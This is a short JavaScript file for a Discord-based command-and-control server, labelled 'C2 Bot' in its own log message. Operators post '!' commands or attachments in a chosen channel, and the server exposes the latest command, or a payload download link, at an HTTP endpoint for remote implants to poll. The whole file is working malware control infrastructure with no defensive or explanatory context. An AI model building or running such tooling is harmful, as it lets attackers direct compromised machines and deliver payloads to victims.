const { Client, IntentsBitField } = require('discord.js');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// Configuration
const BOT_TOKEN = 'YOUR_DISCORD_BOT_TOKEN_HERE'; // Replace with your bot token
const CHANNEL_ID = 'YOUR_CHANNEL_ID_HERE'; // Replace with your channel ID

// In-memory command store
let latestCommand = '';

// Initialize Discord bot
const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
  ],
});

// Announce bot startup
client.on('ready', () => {
  console.log('C2 Bot online!');
});

// Command handler
client.on('messageCreate', async (message) => {
  if (message.author.bot || message.channel.id !== CHANNEL_ID) return;
  if (!message.content.startsWith('!')) return;

  latestCommand = message.content;
  if (message.attachments.size > 0) {
    const url = message.attachments.first().url;
    latestCommand = `!upload ${url}`;
  }
});

// Express endpoint for commands
app.get('/command', (req, res) => {
  res.set('Content-Type', 'text/plain');
  res.send(latestCommand);
});

// Start server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

// Login bot
client.login(BOT_TOKEN);
